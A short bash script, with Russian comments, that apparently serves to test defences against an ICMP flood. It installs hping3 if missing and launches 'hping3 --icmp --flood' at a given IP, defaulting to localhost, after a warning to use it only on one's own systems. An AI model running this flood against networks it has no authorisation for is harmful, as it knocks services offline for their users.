#!/bin/bash
# Скрипт для тестирования ICMP Flood атаки
# Использование: ./test_attack_icmp_flood.sh <target_ip>

TARGET_IP=${1:-"127.0.0.1"}

echo "Тестирование ICMP Flood (Ping Flood) атаки на $TARGET_IP"
echo "ВНИМАНИЕ: Это тестовая атака! Используйте только на своих системах."
echo "Нажмите Ctrl+C для остановки"
sleep 3

# Проверка наличия hping3
if ! command -v hping3 &> /dev/null; then
    echo "Установка hping3..."
    sudo apt-get install -y hping3
fi

# Запуск ICMP Flood
echo "Запуск ICMP Flood атаки..."
hping3 --icmp --flood $TARGET_IP
